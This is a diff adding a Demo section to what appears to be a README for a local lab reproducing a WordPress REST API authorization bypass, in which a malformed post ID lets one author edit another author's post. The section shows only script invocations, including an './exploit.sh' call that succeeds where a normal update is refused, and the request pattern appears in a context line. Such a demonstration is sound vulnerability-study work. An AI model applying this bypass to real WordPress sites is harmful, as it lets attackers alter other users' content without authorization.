@@ -163,4 +163,41 @@ as `POST /wp-json/wp/v2/posts/1984?id=N_then_non_numeric_chars`.
 
 ## Demo
 
-TODO
+Make sure Wordpress is running:
+
+```bash
+docker-compose up
+```
+
+Get the posts of author1:
+
+```bash
+./get_posts.sh author1
+```
+
+Update a post:
+
+```bash
+./update_post.sh 14 mysupercontent author1
+# It works
+```
+
+Get the posts of author2:
+
+```bash
+./get_posts.sh author2
+```
+
+Update a post of author2 with author1:
+
+```bash
+./update_post.sh 17 mysupercontent author1
+# Error: Sorry, you are not allowed to edit this post.
+```
+
+Update a post of author2 with author1 and a malicious url:
+
+```bash
+./exploit.sh 17 mysupercontent author1
+# It works
+```
